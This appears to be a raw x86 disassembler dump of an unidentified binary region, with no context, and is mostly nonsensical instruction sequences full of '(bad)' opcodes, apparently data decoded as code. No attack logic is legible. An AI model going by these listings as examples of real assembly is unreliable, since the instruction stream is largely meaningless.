  429821:	ds (bad) 
  429823:	pop    ebp
  429824:	je     0x42980e
  429826:	adc    al,0x72
  429828:	jo     0x4297ba
  42982a:	(bad)  
  42982b:	pop    ebp
  42982c:	jo     0x429838
  42982e:	fistp  DWORD PTR [edx+0x72]
  429831:	cmp    dl,ah
  429833:	mov    dh,0x76
  429835:	in     al,0xd3
  429837:	jb     0x4298a9
  429839:	sub    al,0xd4
  42983b:	ss ja  0x429844
  42983e:	aam    0x3a
  429840:	jb     0x429858
  429842:	aam    0x76
  429844:	rcl    BYTE PTR [esi+0x0],0x0
  429848:	add    BYTE PTR [eax+eax*1],cl
  42984b:	add    ah,dl
  42984d:	xor    dh,BYTE PTR [edx+0x28]
  429850:	aam    0x76
  429852:	sar    BYTE PTR [ebp+0x0],0x0
  429856:	and    dl,ah
  429858:	or     dh,BYTE PTR [edx+0x17]
  42985b:	aam    0x5e
  42985d:	je     0x429845
  42985f:	in     eax,dx
  429860:	push   es
  429861:	jb     0x4298ae
  429863:	aam    0x45
  429865:	jb     0x429843
  429867:	or     eax,0xd2ce77a3
  42986c:	pop    edx
  42986d:	jno    0x42983f
  42986f:	(bad)  
  429870:	repz push 0x16
  429873:	aam    0xeb
  429875:	jne    0x42983d
  429877:	sbb    edi,DWORD PTR [ebp+0x71]
  42987a:	(bad)  
  42987b:	out    dx,al
  42987c:	add    BYTE PTR [eax],al
  42987e:	rcl    BYTE PTR [edx],cl
  429880:	jne    0x429876
  429882:	(bad)  
  429884:	jae    0x42982b
  429886:	sbb    ecx,DWORD PTR [esi]
  429888:	js     0x4298a2
  42988a:	sbb    edi,edi
  42988c:	outs   dx,DWORD PTR ds:[esi]
  42988d:	les    eax,FWORD PTR [ebx-0x442d0000]
  429893:	jo     0x4298ea
  429895:	fwait
  429896:	and    eax,0x201ba175
  42989b:	jno    0x4298b1
  42989d:	sbb    ebp,DWORD PTR [esi]
  42989f:	jns    0x42989f
  4298a1:	rcr    BYTE PTR [esi-0x4f28dd95],cl
  4298a7:	jnp    0x4298f9
  4298a9:	(bad)  
  4298aa:	shl    BYTE PTR [edx-0x74],1
  4298ad:	fld    DWORD PTR [eax]
  4298af:	add    dh,dl
  4298b1:	(bad)  
  4298b3:	rcr    dl,0x0
  4298b6:	add    dl,dl
  4298b8:	int    0x72
  4298ba:	ret    
  4298bb:	(bad)  
  4298bc:	jns    0x429937
  4298be:	xchg   DWORD PTR [edx-0x50],ebx
  4298c1:	jno    0x4298d2
  4298c3:	(bad)  
  4298c4:	dec    ebp
  4298c5:	je     0x4298ff
  4298c7:	cdq    
  4298c8:	pop    esi
  4298c9:	js     0x429905
  4298cb:	shl    al,cl
  4298cd:	jae    0x429904
  4298cf:	aam    0x73
  4298d1:	ror    BYTE PTR [edx+0x6b400000],0x0
  4298d8:	add    BYTE PTR [ebx],bh
  4298da:	or     dh,BYTE PTR [edx+0x1b]
  4298dd:	aam    0x92
  4298df:	jns    0x4298d4
  4298e1:	sub    ah,BYTE PTR [edi-0x40]
  4298e4:	rol    DWORD PTR [eax],1
  4298e6:	add    bh,cl
  4298e8:	sub    ah,BYTE PTR [edx+esi*2]
  4298eb:	mov    dl,0x2c
  4298ed:	cmp    bh,BYTE PTR [eax-0x6a]
  4298f0:	sar    BYTE PTR [edx+0x672c317a],1
  4298f6:	ror    cl,0x0
  4298f9:	add    bl,cl
  4298fb:	sub    ch,BYTE PTR ds:0x5fd2e370
  429901:	jp     0x4298e9
  429903:	jmp    0x603d1241
  429908:	mov    cl,0x76
  42990a:	pop    ss
  42990b:	aam    0x15
  42990d:	jns    0x4298bf
  42990f:	fdivr  DWORD PTR [ebp+ebp*2+0x7a92d5fb]
  429916:	xor    edi,edx
  429918:	jge    0x429988
  42991a:	adc    esp,edx
  42991c:	jge    0x42998a
  42991e:	loopne 0x4298f7
  429920:	jle    0x42999b
  429922:	push   esp
  429923:	fwait
  429924:	pop    es
  429925:	jno    0x4298ec
  429927:	aam    0x24
  429929:	jb     0x4298d3
  42992b:	fcomp  st(0)
  42992d:	je     0x4298f2
  42992f:	fcmovne st,st(3)
  429931:	je     0x4298fa
  429933:	out    dx,eax
  429934:	dec    esp
  429935:	cmp    al,BYTE PTR [eax]
  429937:	add    BYTE PTR [edx+0x16],dh
  42993a:	aam    0x2
  42993c:	jne    0x4299b7
  42993e:	lea    esp,[esi]
  429940:	jb     0x4299aa
  429942:	aam    0xe
  429944:	jl     0x429903
  429946:	jmp    0xd5740ded
  42994b:	outs   dx,BYTE PTR ds:[esi]
  42994c:	rcl    cl,0x0
  42994f:	add    BYTE PTR [edx+ebp*1-0x2a368b5d],ch
  429956:	outs   dx,DWORD PTR ds:[esi]
  429957:	ja     0x429915
  429959:	cs cmp al,al
  42995c:	pop    edi
  42995d:	add    BYTE PTR [eax],al
  42995f:	leave  
  429960:	aad    0xc2
  429962:	jne    0x4299d5
  429964:	ror    BYTE PTR [edx+0x76],1
  429967:	clc    
  429968:	imul   edi,DWORD PTR [eax-0x40],0x7a
  42996c:	add    BYTE PTR [eax],al
  42996e:	or     DWORD PTR [ebx+0x7ec045],0x0
  429975:	shr    BYTE PTR [edx],1
  429977:	push   0xccc0
  42997c:	mov    ecx,0xf5a4de2a
  429981:	lods   al,BYTE PTR ds:[esi]
  429982:	or     edi,DWORD PTR [eax-0x29]
  429985:	jmp    0x2af90548
  42998a:	imul   eax,eax,0xa4000023
  429990:	sub    cl,BYTE PTR [ecx+0x3a2cffc1]
  429996:	jg     0x429937
  429998:	sub    DWORD PTR [ebx+0x6517696d],eax
  42999e:	shr    BYTE PTR [edi],0x0
  4299a1:	add    al,bh
  4299a3:	aam    0xff
  4299a5:	jno    0x429984
  4299a7:	fwait
  4299a8:	sub    BYTE PTR [ebx-0x7a],bh
  4299ab:	aam    0xd3
  4299ad:	jno    0x4299c8
  4299af:	pop    edx
  4299b0:	icebp  
  4299b1:	push   0x7c522ad2
  4299b6:	mov    ds:0x8071ead4,al
  4299bb:	pop    es
  4299bc:	add    BYTE PTR [eax],al
  4299be:	ins    BYTE PTR es:[edi],dx
  4299bf:	bnd jb 0x429952
  4299c2:	pop    ss
  4299c3:	add    al,0x92
  4299c5:	add    BYTE PTR [eax],al
  4299c7:	jb     0x429a2a
  4299c9:	adc    al,0x2e
  4299cb:	jb     0x4299a1
  4299cd:	fwait
  4299ce:	or     al,0x75
  4299d0:	add    BYTE PTR [eax],al
  4299d2:	ins    DWORD PTR es:[edi],dx
  4299d3:	and    BYTE PTR [eax+eax*1],0x0
  4299d7:	ins    BYTE PTR es:[edi],dx
  4299d8:	sub    DWORD PTR [ecx+0x11],edi
  4299db:	cwde   
  4299dc:	and    eax,0x802abd72
  4299e1:	rol    BYTE PTR [eax],1
  4299e3:	add    BYTE PTR [ecx-0x70],bh
  4299e6:	pop    ss
  4299e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299e8:	jno    0x4299a4
  4299ea:	scas   eax,DWORD PTR es:[edi]
  4299eb:	test   al,0x79
  4299ed:	sbb    BYTE PTR [edi+0x86c038],0x0
  4299f4:	sbb    BYTE PTR [ecx],0x0
  4299f7:	add    BYTE PTR [eax],bl
  4299f9:	jle    0x429a74
  4299fb:	mov    ebp,0xc5797c13
  429a00:	outs   dx,DWORD PTR ds:[esi]
  429a01:	out    dx,eax
  429a02:	jl     0x4299d1
  429a04:	pop    ss
  429a05:	cmp    eax,eax
  429a07:	ret    
  429a08:	add    BYTE PTR [eax],al
  429a0a:	les    edi,FWORD PTR [ecx+0x0]
  429a0d:	add    BYTE PTR [edx],ch
  429a0f:	mov    ebp,DWORD PTR [eax-0xb]
  429a12:	pop    ss
  429a13:	push   ss
  429a14:	sar    BYTE PTR [esi+0x0],0x0
  429a18:	ja     0x429a31
  429a1a:	push   ds
  429a1b:	rol    BYTE PTR [edx+0x0],0x0
  429a1f:	mov    ds:0x8c0332a,al
  429a24:	add    BYTE PTR [eax],al
  429a26:	mov    esi,fs
  429a28:	add    BYTE PTR [eax],al
  429a2a:	sub    dl,BYTE PTR [edi-0x40]
  429a2d:	pop    ecx
  429a2e:	add    BYTE PTR [eax],al
  429a30:	jmp    FWORD PTR [edx]
  429a32:	mov    esp,0xccc06b
  429a37:	add    BYTE PTR [edx],ch
  429a39:	xor    DWORD PTR [ebx-0x5b],0x2a
  429a3d:	shl    BYTE PTR ss:[ecx],0x0
  429a41:	add    BYTE PTR [ebp-0x589012d6],al
  429a47:	sub    ch,BYTE PTR [eax]
  429a49:	rcr    BYTE PTR [eax],0x0
  429a4c:	add    BYTE PTR [edx-0xc88c3d6],bl
  429a52:	push   ecx
  429a53:	aaa    
  429a54:	rol    cl,0x0
  429a57:	add    BYTE PTR [ebx-0x76845ad6],al
  429a5d:	push   ecx
  429a5e:	aam    0x6e
  429a60:	adc    bl,BYTE PTR [esi+0x22]
  429a63:	outs   dx,DWORD PTR ds:[esi]
  429a64:	adc    eax,0xb6c07299
  429a69:	add    BYTE PTR [eax],al
  429a6b:	xchg   ecx,eax
  429a6c:	sub    dl,al
  429a6e:	jb     0x4299fd
  429a70:	cwde   
  429a71:	popa   
  429a72:	imul   eax,DWORD PTR [ecx+ebp*4+0x55d00000],0x7b
  429a7a:	jo     0x429acd
  429a7c:	mov    ch,0x72
  429a7e:	fcom   st(4)
  429a80:	mov    DWORD PTR [ebp-0x7b],esi
  429a83:	sbb    bl,cl
  429a85:	jbe    0x429a0e
  429a87:	push   eax
  429a88:	xor    DWORD PTR [esi-0x3a],0xffffffd5
  429a8c:	std    
  429a8d:	jno    0x429a98
  429a8f:	jb     0x429a56
  429a91:	jae    0x429af3
  429a93:	push   ebp
  429a94:	retf   0xa17b
  429a97:	lods   al,BYTE PTR ds:[esi]
  429a98:	pop    ebp
  429a99:	jbe    0x429a48
  429a9b:	pop    ecx
  429a9c:	outs   dx,DWORD PTR ds:[esi]
  429a9d:	dec    esi
  429a9e:	es push ebp
  429aa0:	leave  
  429aa1:	ja     0x429ae4
  429aa3:	xchg   esi,eax
  429aa4:	pop    ebx
  429aa5:	test   DWORD PTR [ebx+0x69],edi
  429aa8:	mov    ebx,0x64bd223f
  429aad:	dec    esi
  429aae:	jp     0x429b29
  429ab0:	jg     0x429a71
  429ab2:	hlt    
  429ab3:	fsubr  DWORD PTR [edi]
  429ab5:	pop    es
  429ab6:	mov    dh,0x2a
  429ab8:	pop    ebx
  429ab9:	inc    edx
  429aba:	dec    ecx
  429abb:	ins    BYTE PTR es:[edi],dx
  429abc:	bound  ecx,QWORD PTR [esi+0x65]
  429abf:	jns    0x429b2f
  429ac1:	dec    esi
  429ac2:	nop
  429ac3:	outs   dx,DWORD PTR ds:[si]
  429ac5:	imul   esi,ebp,0x4b802c
  429acb:	add    BYTE PTR [ebx+0x5a],dh
  429ace:	outs   dx,BYTE PTR ds:[esi]
  429acf:	add    BYTE PTR [eax+eax*1],bh
  429ad2:	add    al,al
  429ad4:	fld    QWORD PTR [eax]
  429ad6:	add    cl,cl
  429ad8:	sub    ah,BYTE PTR [ebx+0x4625ea3f]
  429ade:	les    esi,FWORD PTR [esi]
  429ae0:	add    BYTE PTR [eax],al
  429ae2:	pop    esp
  429ae3:	fmul   DWORD PTR [edi+0x47906e73]
  429ae9:	ror    BYTE PTR [edi+0x0],0x0
  429aed:	xchg   ecx,eax
  429aee:	sub    cl,BYTE PTR [edi]
  429af0:	jne    0x429ac9
  429af2:	push   ebx
  429af3:	js     0x429b64
  429af5:	xor    bl,BYTE PTR [esi]
  429af7:	jbe    0x429b6c
  429af9:	push   cs
  429afa:	fnsave [esp+edi*2]
  429afd:	mov    eax,0x1071d755
  429b02:	lods   eax,DWORD PTR ds:[esi]
  429b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b04:	outs   dx,BYTE PTR ds:[esi]
  429b05:	jg     0x429adc
  429b07:	sub    dh,BYTE PTR [ebx-0x44]
  429b0a:	shl    DWORD PTR [edx+esi*2+0x77c755bc],1
  429b11:	cwde   
  429b12:	test   eax,0xa57b77ab
  429b17:	sub    dh,BYTE PTR [ebx+0x5d]
  429b1a:	ins    DWORD PTR es:[edi],dx
  429b1b:	mov    cl,0x7a
  429b1d:	or     edx,DWORD PTR [ebp+0x6c]
  429b20:	inc    DWORD PTR [eax+edi*2]
  429b23:	add    BYTE PTR [eax],al
  429b25:	pop    ebx
  429b26:	cmp    DWORD PTR [esi+0x5e],esi
  429b29:	inc    ecx
  429b2a:	xor    edx,DWORD PTR [edx]
  429b2c:	xchg   esp,eax
  429b2d:	(bad)  
  429b2e:	inc    DWORD PTR [eax]
  429b30:	add    al,al
  429b32:	bound  eax,QWORD PTR [eax]
  429b34:	add    BYTE PTR [edi+0x5d],dh
  429b37:	cs ret 
  429b39:	je     0x429b97
  429b3b:	adc    al,BYTE PTR [eax+0x200002b]
  429b41:	jns    0x429bc0
  429b43:	jge    0x429b4d
  429b45:	xlat   BYTE PTR ds:[ebx]
  429b46:	add    BYTE PTR [eax],al
  429b48:	shr    DWORD PTR [edi-0x69bd8c6b],cl
  429b4e:	mov    al,0xbf
  429b50:	push   0x2c
  429b52:	mov    edi,0x2c960f73
  429b57:	shr    dh,0x0
  429b5a:	add    BYTE PTR [esi+0x26c0342a],dh
  429b60:	add    BYTE PTR [eax],al
  429b62:	push   ebp
  429b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b64:	pop    edx
  429b65:	jae    0x429b9f
  429b67:	test   al,0x58
  429b69:	jns    0x429be2
  429b6b:	sub    al,0x93
  429b6d:	push   esi
  429b6e:	sub    DWORD PTR [edi+esi*1+0x59],0xffffffde
  429b73:	sub    BYTE PTR [eax+ebx*1],0xc0
  429b77:	out    dx,eax
  429b78:	add    BYTE PTR [eax],al
  429b7a:	mov    BYTE PTR [ecx],bh
  429b7c:	add    BYTE PTR [eax],al
  429b7e:	or     cl,BYTE PTR [eax+0x13]
  429b81:	add    BYTE PTR [eax],al
  429b83:	data16 lahf 
  429b85:	cmp    DWORD PTR [ebx-0x4f],ecx
  429b88:	xchg   DWORD PTR [ebx],esi
  429b8a:	push   esp
  429b8b:	xchg   esp,eax
  429b8c:	stos   DWORD PTR es:[edi],eax
  429b8d:	pop    ebp
  429b8e:	push   eax
  429b8f:	mov    edi,0x83467983
  429b94:	cdq    
  429b95:	jle    0x429bd8
  429b97:	sbb    BYTE PTR [esi+0xdd4407],0x0
  429b9e:	xchg   edx,eax
  429b9f:	adc    edx,DWORD PTR [eax+ebx*4-0x80]
  429ba3:	fld    DWORD PTR [eax]
  429ba5:	add    BYTE PTR [edi-0x7dad2216],bl
  429bab:	cdq    
  429bac:	adc    BYTE PTR ds:0xe92528dc,al
  429bb2:	mov    edx,DWORD PTR [ebx]
  429bb4:	pusha  
  429bb5:	cwde   
  429bb6:	xchg   ecx,eax
  429bb7:	jl     0x429c02
  429bb9:	and    cl,ah
  429bbb:	or     DWORD PTR [eax],eax
  429bbd:	add    bl,cl
  429bbf:	ficomp WORD PTR [ebx]
  429bc1:	fsubr  QWORD PTR [ebx]
  429bc3:	test   BYTE PTR [esi],ah
  429bc5:	add    BYTE PTR [eax],al
  429bc7:	xchg   edx,eax
  429bc8:	or     DWORD PTR [ecx+esi*1-0x6],ebp
  429bcc:	lahf   
  429bcd:	pusha  
  429bce:	or     eax,0x67c0c9
  429bd3:	add    BYTE PTR [ecx],ch
  429bd5:	pop    esi
  429bd6:	ins    DWORD PTR es:[edi],dx
  429bd7:	cmp    eax,0xc2d07ae1
  429bdc:	jne    0x429c25
  429bde:	in     al,0xa6
  429be0:	push   0x55532f6f
  429be5:	in     eax,0x71
  429be7:	call   0xf75e:0xa33d10e0
  429bee:	inc    edi
  429bef:	loopne 0x429b8a
  429bf1:	icebp  
  429bf2:	out    0x64,eax
  429bf4:	push   edx
  429bf5:	fadd   QWORD PTR [ebx+ebp*4]
  429bf8:	add    BYTE PTR [eax],al
  429bfa:	(bad)  
  429bfb:	sar    DWORD PTR gs:[esi],0xaf
  429bff:	out    0xfc,al
  429c01:	add    al,0x8a
  429c03:	add    BYTE PTR [eax],al
  429c05:	pop    ebx
  429c06:	cmp    al,bl
  429c08:	jo     0x429c38
  429c0a:	stc    
  429c0b:	js     0x429c67
  429c0d:	dec    ebx
  429c0e:	and    BYTE PTR [ecx+0x36],ah
  429c11:	mov    ds:0x2e3cf72a,eax
  429c16:	cdq    
  429c17:	mov    al,0xb1
  429c19:	cdq    
  429c1a:	ficom  WORD PTR [ebx-0x74]
  429c1d:	sub    eax,DWORD PTR [eax]
  429c1f:	add    bl,bh
  429c21:	jb     0x429bd1
  429c23:	jnp    0x429bff
  429c25:	add    eax,0x7cf58745
  429c2a:	sbb    edx,DWORD PTR cs:[ecx]
  429c2d:	pop    edx
  429c2e:	sub    ah,BYTE PTR [edi]
  429c30:	mov    cl,0xe6
  429c32:	or     BYTE PTR [edx],0xff
  429c35:	out    dx,al
  429c36:	pop    ss
  429c37:	xchg   esp,eax
  429c38:	sbb    BYTE PTR [ebx+0x15570000],0x28
  429c3f:	leave  
  429c40:	bndstx [ebx+0x73d2e082],bnd3
  429c47:	fucomp st(5)
  429c49:	adc    al,0x54
  429c4b:	stc    
  429c4c:	add    al,0x4b
  429c4e:	add    BYTE PTR [eax],al
  429c50:	cmp    bl,BYTE PTR [eax+ebp*4]
  429c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c54:	aaa    
  429c55:	repz push 0xffffffc1
  429c58:	aaa    
  429c59:	ficom  DWORD PTR [edx+0x78]
  429c5c:	push   eax
  429c5d:	lea    edx,[edi+0x624087a9]
  429c63:	add    BYTE PTR [eax],al
  429c65:	xchg   edx,eax
  429c66:	dec    edi
  429c67:	dec    edx
  429c68:	inc    edi
  429c69:	loope  0x429c99
  429c6b:	je     0x429c7a
  429c6d:	jmp    0xda401b92
  429c72:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  429c74:	retf   
  429c75:	out    0x43,al
  429c77:	dec    ecx
  429c78:	jmp    0x2b254a26
  429c7d:	loopne 0x429ce1
  429c7f:	mov    eax,0x83b1d98b
  429c84:	into   
  429c85:	xchg   edx,eax
  429c86:	js     0x429c40
  429c88:	push   ss
  429c89:	out    dx,eax
  429c8a:	outs   dx,DWORD PTR ds:[esi]
  429c8b:	jecxz  0x429c9c
  429c8d:	loopne 0x429c19
  429c8f:	pop    es
  429c90:	dec    edx
  429c91:	or     al,0xb0
  429c93:	add    BYTE PTR [eax],al
  429c95:	ins    DWORD PTR es:[edi],dx
  429c96:	loop   0x429ce6
  429c98:	outs   dx,BYTE PTR cs:[esi]
  429c9a:	in     al,0x5a
  429c9c:	loopne 0x429cca
  429c9e:	jecxz  0x429ceb
  429ca0:	ins    BYTE PTR es:[edi],dx
  429ca1:	pop    ss
  429ca2:	push   esp
  429ca3:	jb     0x429c42
  429ca5:	js     0x429cf5
  429ca7:	inc    edi
  429ca8:	repz ficomp DWORD PTR [eax]
  429cab:	out    dx,al
  429cac:	setns  BYTE PTR [ebx]
  429caf:	pop    esp
  429cb0:	retf   
  429cb1:	retf   0x31ed
  429cb4:	in     eax,0x99
  429cb6:	test   dl,dh
  429cb8:	add    BYTE PTR [eax],al
  429cba:	mov    edx,0x7de80f10
  429cbf:	call   0x996b5f2
  429cc4:	test   BYTE PTR [edx+0x9b8c],0x48
  429ccb:	add    BYTE PTR [bx+si],al
  429cce:	sub    eax,0xa585c713
  429cd3:	call   0x704660c2
  429cd8:	jmp    0x429d0c
  429cda:	in     eax,0x74
  429cdc:	mov    edi,0x4fec2386
  429ce1:	mov    esi,0x30c3e8b7
  429ce6:	add    BYTE PTR [eax+eax*1+0x0],al
  429cea:	jo     0x429ca0
  429cec:	mov    WORD PTR [ecx+0x0],?
  429cef:	add    BYTE PTR [eax-0x14],bh
  429cf2:	int3   
  429cf3:	call   0x58e3:0x4b380000
  429cfa:	fs fs dec edx
  429cfd:	test   DWORD PTR [eax+eax*1+0x700000a8],esp
  429d04:	fsubr  QWORD PTR [eax+edi*2]
  429d07:	and    esp,ecx
  429d09:	icebp  
  429d0a:	js     0x429d85
  429d0c:	push   edi
  429d0d:	(bad)  
  429d0e:	js     0x429cf7
  429d10:	repnz das 
  429d12:	add    BYTE PTR [edx],bh
  429d14:	add    BYTE PTR [eax],al
  429d16:	jo     0x429d46
  429d18:	push   edx
  429d19:	js     0x429d04
  429d1b:	add    al,0xd7
  429d1d:	add    BYTE PTR [eax],al
  429d1f:	sub    al,0x78
  429d21:	enter  0xbb,0x0
  429d25:	push   0xffffff82
  429d27:	fs dec esp
  429d29:	mov    esi,0xa7e50000
  429d2e:	inc    eax
  429d2f:	lahf   
  429d30:	add    BYTE PTR [eax],al
  429d32:	dec    esi
  429d33:	xchg   ebx,eax
  429d34:	sub    al,0x78
  429d36:	enter  0x7,0x0
  429d3a:	cmp    eax,0x29fd9852
  429d3f:	sub    al,0x78
  429d41:	mov    DWORD PTR [esi+0x2c],edi
  429d44:	inc    ebx
  429d45:	dec    esi
  429d46:	outs   dx,BYTE PTR ds:[esi]
  429d47:	mov    bl,0xb8
  429d49:	dec    esp
  429d4a:	test   DWORD PTR [eax],eax
  429d4c:	add    BYTE PTR [eax+0x2c000055],al
  429d52:	jns    0x429d9f
  429d54:	pop    esp
  429d55:	gs push edi
  429d57:	ret    
  429d58:	arpl   WORD PTR [ecx-0x57],sp
  429d5b:	jp     0x429d3d
  429d5d:	sub    ecx,DWORD PTR [esi+0x71]
  429d60:	pop    ebx
  429d61:	ficomp WORD PTR [ebx+0x78]
  429d64:	fcmovnu st,st(3)
  429d66:	inc    ecx
  429d67:	ja     0x429d0e
  429d69:	retf   0x4e42
  429d6c:	push   ebp
  429d6d:	sbb    ebp,DWORD PTR [esp+edi*2]
  429d70:	jns    0x429d5e
  429d72:	add    DWORD PTR [ecx+0x2],esi
  429d75:	fwait
  429d76:	mov    ds:0x90987575,eax
  429d7b:	jne    0x429d2b
  429d7d:	adc    al,0xf3
  429d7f:	jno    0x429dbf
  429d81:	push   ebx
  429d82:	(bad)  [esi-0x4]
  429d85:	call   0x10ef0b4c
  429d8a:	dec    edi
  429d8b:	cmp    BYTE PTR [eax+0x0],0x0
  429d8f:	std    
  429d90:	sub    edi,DWORD PTR [esi+0x79]
  429d93:	pmaxub mm5,QWORD PTR [ecx]
  429d96:	imul   ebx,ebp,0x6d
  429d99:	test   DWORD PTR [edx],eax
  429d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d9c:	das    
  429d9d:	mov    ah,0x6c
  429d9f:	xor    edx,DWORD PTR [eax+0x3c]
  429da2:	jne    0x429d80
  429da4:	aam    0x41
  429da6:	js     0x429d7e
  429da8:	push   edi
  429da9:	fdiv   st(2),st
  429dab:	push   ss
  429dac:	fdivrp st(5),st
  429dae:	mov    ds:0x4992bdf,al
  429db3:	mov    bh,0x0
  429db5:	add    cl,bl
  429db7:	mov    ds:0x8a87463a,eax
  429dbc:	push   0xffffff80
  429dbe:	imul   eax,DWORD PTR [eax],0x0
  429dc1:	mov    al,ds:0xf58074de
  429dc6:	add    BYTE PTR [eax],al
  429dc8:	ret    
  429dc9:	sub    ebx,DWORD PTR [ebx-0x80]
  429dcc:	inc    eax
  429dcd:	add    BYTE PTR [eax],al
  429dcf:	fisubr WORD PTR [ebx]
  429dd1:	lea    ebp,[ebx+0x11]
  429dd4:	sub    BYTE PTR [ecx+ebx*2+0x719dde2a],bl
  429ddb:	pop    ds
  429ddc:	aad    0x2b
  429dde:	outs   dx,DWORD PTR ds:[esi]
  429ddf:	push   ds
  429de0:	and    edi,DWORD PTR [eax-0x3a]
  429de3:	call   0x5a:0x4c73c713
  429dea:	add    cl,dl
  429dec:	inc    ebx
  429ded:	sub    ch,0x0
  429df0:	add    BYTE PTR [ebp-0x568cb92f],al
  429df6:	(bad)  
  429df7:	mov    esp,0xb291ed71
  429dfc:	jne    0x429e11
  429dfe:	rcl    BYTE PTR [eax+eax*1],0x0
  429e02:	and    BYTE PTR [esi-0x2d],cl
  429e05:	sub    esi,DWORD PTR [edx]
  429e07:	jb     0x429e09
  429e09:	mov    eax,ds:0x9c980000
  429e0e:	and    eax,0x25095951
  429e13:	hlt    
  429e14:	push   esp
  429e15:	mov    bl,0x6c
  429e17:	sbb    ch,dl
  429e19:	data16 jbe 0x429e3c
  429e1c:	lods   eax,DWORD PTR ds:[esi]
  429e1d:	jne    0x429e8c
  429e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e20:	push   eax
  429e21:	pop    esp
  429e22:	jbe    0x429e5e
  429e24:	xor    dh,BYTE PTR [esp+ebp*2-0x196c279a]
  429e2b:	ror    DWORD PTR cs:[esi],0x78
  429e2f:	dec    edi
  429e30:	push   0x9ed96b1a
  429e35:	jns    0x429db7
  429e37:	dec    edx
  429e38:	add    BYTE PTR [eax],al
  429e3a:	adc    ch,dl
  429e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e3d:	outs   dx,DWORD PTR ds:[esi]
  429e3e:	out    dx,eax
  429e3f:	push   ss
  429e40:	jno    0x429e44
  429e42:	push   esi
  429e43:	shr    bh,0x0
  429e46:	add    BYTE PTR [edi+eax*8+0x37],bl
  429e4a:	dec    edx
  429e4b:	aad    0xe5
  429e4d:	lds    ebp,FWORD PTR [ebx]
  429e4f:	jmp    0x7f63adc9
  429e54:	imul   eax,DWORD PTR [ecx+eiz*2],0x0
  429e58:	add    BYTE PTR ds:0x71803a,ah
  429e5e:	add    cl,al
  429e60:	sub    edi,DWORD PTR [eax-0x80]
  429e63:	cmp    DWORD PTR [eax],eax
  429e65:	add    BYTE PTR [eax-0x38db13d5],ch
  429e6b:	sub    edx,DWORD PTR [eax-0x3b]
  429e6e:	push   ss
  429e6f:	out    dx,eax
  429e70:	pushf  
  429e71:	inc    esi
  429e72:	lahf   
  429e73:	pop    esp
  429e74:	jae    0x429df6
  429e76:	pop    ecx
  429e77:	add    BYTE PTR [eax],al
  429e79:	sbb    al,0x55
  429e7b:	ret    
  429e7c:	fist   WORD PTR [ebx-0x24]
  429e7f:	add    al,0x49
  429e81:	add    BYTE PTR [eax],al
  429e83:	ret    0x974f
  429e86:	imul   ecx,DWORD PTR gs:[ebp-0x117f7628],0x0
  429e8e:	add    BYTE PTR [ebx],bh
  429e90:	xchg   ecx,eax
  429e91:	and    bh,BYTE PTR [ecx+0x50]
  429e94:	nop
  429e95:	js     0x429f12
  429e97:	(bad)  
  429e98:	out    dx,al
  429e99:	aas    
  429e9a:	jne    0x429e4e
  429e9c:	aam    0x40
  429e9e:	fld    DWORD PTR [eax]
  429ea0:	add    BYTE PTR [eax+0x2d0000ef],al
  429ea6:	dec    edi
  429ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ea8:	push   0xfffffffa
  429eaa:	xchg   edx,eax
  429eab:	pop    es
  429eac:	outs   dx,BYTE PTR ds:[esi]
  429ead:	test   dh,cl
  429eaf:	add    BYTE PTR [eax],al
  429eb1:	xchg   ecx,eax
  429eb2:	mov    ds:0x29d49079,al
  429eb7:	jb     0x429eec
  429eb9:	xchg   ecx,eax
  429eba:	in     eax,dx
  429ebb:	jno    0x429ee5
  429ebd:	rcr    DWORD PTR [eax+0x7d],1
  429ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ec1:	sub    BYTE PTR [ebx],bh
  429ec3:	jne    0x429e53
  429ec5:	aam    0x0
  429ec7:	cmp    eax,0x1720000
  429ecc:	iret   
  429ecd:	fdiv   DWORD PTR [ecx-0x75]
  429ed0:	push   ebp
  429ed1:	push   cs
  429ed2:	jns    0x429e70
  429ed4:	call   0x9456107e
  429ed9:	cs or  cl,0x0
  429edd:	add    BYTE PTR [esi+0x55],al
  429ee0:	pop    ebp
  429ee1:	jne    0x429eb2
  429ee3:	aam    0x13
  429ee5:	xor    BYTE PTR [ecx+0x0],0x0
  429ee9:	call   0x6900:0x8804ac
  429ef0:	mov    al,ds:0x3972032b
  429ef5:	mov    ecx,0x20801e
  429efa:	add    BYTE PTR [eax+0x76709bd4],bl
  429f00:	xchg   esp,eax
  429f01:	dec    ecx
  429f02:	add    bl,0x0
  429f05:	add    BYTE PTR [ecx-0x97f8dd5],ah
  429f0b:	add    BYTE PTR [eax],al
  429f0d:	cdq    
  429f0e:	sub    ecx,DWORD PTR [eax-0x5]
  429f11:	add    BYTE PTR [eax],al
  429f13:	xor    bh,0x0
  429f16:	add    BYTE PTR [ebx+0x3804b2b],dh
  429f1c:	add    BYTE PTR [eax],al
  429f1e:	push   0x53
  429f20:	xchg   esp,eax
  429f21:	jnp    0x429eea
  429f23:	sub    ecx,DWORD PTR [esi]
  429f25:	jb     0x429ec7
  429f27:	sub    esi,DWORD PTR [ebx-0x76a93c8d]
  429f2d:	jae    0x429efb
  429f2f:	test   DWORD PTR [eax],eax
  429f31:	add    BYTE PTR [ebx],ch
  429f33:	and    BYTE PTR [ebx-0x7c],dh
  429f36:	sbb    eax,DWORD PTR [eax]
  429f38:	add    BYTE PTR [edx],bl
  429f3a:	inc    ebx
  429f3b:	cmp    cl,0x0
  429f3e:	add    BYTE PTR [edx-0x25910dd5],dh
  429f44:	push   esi
  429f45:	(bad)  
  429f46:	jbe    0x429f7b
  429f48:	ficomp DWORD PTR [esi-0xea90a92]
  429f4e:	addr16 xchg ebx,eax
  429f50:	sub    esi,DWORD PTR [edi+0x6e]
  429f53:	dec    ecx
  429f54:	(bad)  
  429f55:	lods   al,BYTE PTR ds:[esi]
  429f56:	jb     0x429f69
  429f58:	outs   dx,BYTE PTR ds:[esi]
  429f59:	test   dl,bh
  429f5b:	add    BYTE PTR [eax],al
  429f5d:	jne    0x429f89
